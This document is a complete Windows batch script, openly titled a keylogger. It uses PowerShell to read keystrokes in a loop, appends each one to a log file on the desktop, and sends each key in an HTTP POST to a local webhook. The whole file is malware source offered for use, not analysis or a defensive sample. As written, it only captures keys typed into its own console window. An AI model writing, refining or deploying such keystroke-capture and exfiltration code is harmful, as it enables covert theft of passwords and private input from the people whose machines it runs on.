@echo off
cls
title Keylogger-Batch Ver. 1.0

:: Create log file if it doesn't exist
if not exist "%userprofile%\desktop\keylogger.txt" (
  echo Keylogger started at %date% %time% > "%userprofile%\desktop\keylogger.txt"
)

:: Main loop to capture and send keystrokes
:loop
:: Capture keystroke using PowerShell
for /f "delims=" %%a in ('powershell -Command "[Console]::ReadKey($true).KeyChar"') do (
  set "key=%%a"
  echo %%a >> "%userprofile%\desktop\keylogger.txt"
  echo Sending keystroke: %%a
  powershell -Command "Invoke-WebRequest -Uri 'http://localhost:3000/webhook' -Method POST -Body '%%a' -ContentType 'text/plain'"
)

:: Wait for 1 second before next iteration
timeout /t 1 /nobreak >nul
goto loop
